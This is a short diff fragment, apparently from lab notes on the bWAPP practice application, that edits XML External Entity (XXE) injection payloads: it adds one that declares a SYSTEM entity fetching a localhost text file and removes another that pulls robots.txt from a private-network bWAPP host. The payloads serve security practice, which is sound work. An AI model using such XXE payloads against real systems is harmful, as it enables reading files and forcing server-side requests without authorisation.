@@ -5,16 +5,9 @@
     
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE root [
-<!ENTITY bWAPP SYSTEM "http://localhost:8080/JotPot/deneme.txt">
+<!ENTITY secr SYSTEM "http://localhost:8080/JotPot/deneme.txt">
 ]>
-<reset><login>&bWAPP;</login><secret>Adadfbbf</secret></reset>
-
-
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE deneme [
-<!ENTITY canyoupwnme SYSTEM "http://192.168.56.101/bbWAPP/bWAPP/robots.txt">
-]>
-<reset><login>&canyoupwnme;</login><secret>Adadfsaf</secret></reset>
+<reset><login>&secr;</login><secret>Adadfbbf</secret></reset>
 
 
 */
